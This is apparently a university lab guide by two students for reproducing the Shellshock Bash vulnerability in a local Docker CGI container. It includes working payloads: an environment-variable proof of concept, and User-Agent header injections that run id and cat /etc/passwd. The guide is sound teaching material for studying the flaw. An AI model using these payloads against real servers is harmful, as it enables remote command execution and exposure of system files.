# Shellshock

Iva Mucic – Study Number: 202511024  
Sandra Foss Sørensen – Study Number: 202106467  

---

## Setup

Start by building and running the Docker container:

```bash
cd shellshock-lab
docker build -t shellshock-lab .
docker run -d -p 8888:80 --name shellshock shellshock-lab
```

---

## Steps

### 1. Normal request (baseline)

This checks that the CGI script is working as expected:

```bash
curl.exe -s http://localhost:8888/cgi-bin/test.cgi
```

---

### 2. Proof of concept (Bash vulnerability)

Test whether the Bash version inside the container is vulnerable:

```bash
docker exec shellshock bash -c "env x='() { :;}; echo VULNERABLE' bash -c 'echo test'"
```

If the system is vulnerable, `VULNERABLE` will be printed.

---

### 3. Exploit via HTTP (inject command)

Use an HTTP header to inject a command. This prints `VULNERABLE` before the normal output:

```bash
$h = "User-Agent: () { :;}; echo; echo VULNERABLE"
curl.exe -s -H $h http://localhost:8888/cgi-bin/test.cgi
```

---

### 4. Exploit via HTTP (check user)

Show which user the command is executed as:

```bash
$h = "User-Agent: () { :;}; echo; /usr/bin/id"
curl.exe -s -H $h http://localhost:8888/cgi-bin/test.cgi
```

---

### 5. Exploit via HTTP (read file)

Use the vulnerability to read a sensitive file:

```bash
$h = "User-Agent: () { :;}; echo; /bin/cat /etc/passwd"
curl.exe -s -H $h http://localhost:8888/cgi-bin/test.cgi
```
